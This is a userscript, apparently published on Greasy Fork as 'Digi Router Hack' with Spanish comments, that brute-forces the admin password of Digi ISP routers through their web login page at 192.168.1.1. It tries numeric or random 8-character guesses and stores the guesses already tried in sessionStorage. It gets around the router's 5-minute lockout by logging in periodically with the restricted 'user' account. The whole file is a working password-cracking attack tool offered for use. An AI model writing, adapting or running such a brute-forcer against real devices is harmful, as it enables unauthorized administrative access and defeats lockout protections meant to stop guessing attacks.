// ==UserScript==
// @name         Digi Router Hack
// @icon         https://icons.duckduckgo.com/ip2/digimobil.es.ico
// @version      0.1.1
// @namespace    https://greasyfork.org/users/592063
// @description  Script automatizado para los router de Digi, consigue la contraseña "admin" del router.
// @author       wuniversales
// @include      http*://192.168.1.1/*
// @run-at       document-end
// @grant        none
// @license      MIT
// @downloadURL https://update.greasyfork.org/scripts/441707/Digi%20Router%20Hack.user.js
// @updateURL https://update.greasyfork.org/scripts/441707/Digi%20Router%20Hack.meta.js
// ==/UserScript==

const user='user';//Usuario capado de tu router
const password='user';//Contraseña del usuario capado tu router

//IMPORTANTE: Si activas number_attack, desactiva random_attack para que se apliquen los cambios.
const number_attack=false;//Si la contraseña de admin es únicamente numérica, esto te permite obtener la clave de manera mas rapida.

const random_attack=true;//Si la contraseña contiene caracteres especiales, con esto obtendrás la clave.
const dictionary = 'ABCDEFGHIJKLMNÑOPQRSTUVWXYZabcdefghijklmnñopqrstuvwxyz0123456789!¡¿?#=+-*^_$%&/"\{}[].';//Diccionario
const random_attack_length=8;//Tamaño de la clave

const admin_user='admin';//Usuario Admin

(function() {
    let counter,pass,stop;

    function remove_lock() {
        console.log('Eliminando bloqueo...');
        if(document.querySelector("#logOff").style.display!='none'){//Cerrar sesión
            document.querySelector("#logOff").click();
        }
        if(document.querySelectorAll("input[type=text]").length>0 && document.querySelectorAll("input[type=password]").length>0 && document.querySelectorAll("input[type=submit]").length>0){
            document.querySelector("input[type=text]").value=user;
            document.querySelector("input[type=password]").value=password;
            document.querySelector("input[type=submit]").click();
        }
        console.log('Bloqueo eliminado.');
    }

    function num_count() {
        if (Number(sessionStorage.clickcount)==4) {sessionStorage.clickcount = 0;}
        if (sessionStorage.clickcount) {
            sessionStorage.clickcount = Number(sessionStorage.clickcount) + 1;
        }else{
            sessionStorage.clickcount = 1;
        }
        return sessionStorage.clickcount;
    }

    function attack() {
        if(document.querySelector("#logOff").style.display!='none'){
            console.log('Contraseña detectada: '+pass);
            alert("La contraseña de "+admin_user+" es:"+pass);
            clearTimeout(stop);
        }else{
            if(number_attack){
                pass=generated_number();
            }
            if(random_attack){
                pass=generate_key();
            }
            console.log('Probando clave: '+pass);
            if(document.querySelectorAll("input[type=text]").length>0 && document.querySelectorAll("input[type=password]").length>0 && document.querySelectorAll("input[type=submit]").length>0){
                document.querySelector("input[type=text]").value=admin_user;
                document.querySelector("input[type=password]").value=pass;
                document.querySelector("input[type=submit]").click();
            }
        }
    }
    window.onload = function() {
        stop=setTimeout(function(){
            counter=num_count();
            if(counter>=3){//Evita bloqueo de 5 minutos
                remove_lock();
            }else{
                attack();
            }
        },10);
    }

    function generated_number(){
        let numbers;
        if(sessionStorage.getItem("num_dic")!=null){
            numbers=Number(sessionStorage.getItem("num_dic"));
            numbers++;
        }else{
            numbers=0;
        }
        sessionStorage.setItem("num_dic",numbers);
        return numbers;
    }

    function generate_key(){
        let key_tested,temp,randon_key,duplicated;
        if(sessionStorage.getItem("key_dic")!=null){
            key_tested=sessionStorage.getItem("key_dic");
            while(true){
                duplicated=false;
                randon_key=random_pwd(random_attack_length);
                temp=key_tested.split(',');
                for (let i = 0; i < temp.length; i++) {
                    if(temp[i]==randon_key){duplicated=true;break;}
                }
                if(!duplicated){break;}
            }
            key_tested=key_tested+','+randon_key;
            sessionStorage.setItem("key_dic",key_tested);
        }else{
            randon_key=random_pwd(random_attack_length);
            sessionStorage.setItem("key_dic",randon_key);
        }
        return randon_key;
    }

    const random_pwd = (length = 8) => {
        let str = '';
        for (let i = 0; i < length; i++) {
            str += dictionary.charAt(Math.floor(Math.random() * dictionary.length));
        }
        return str;
    };
})();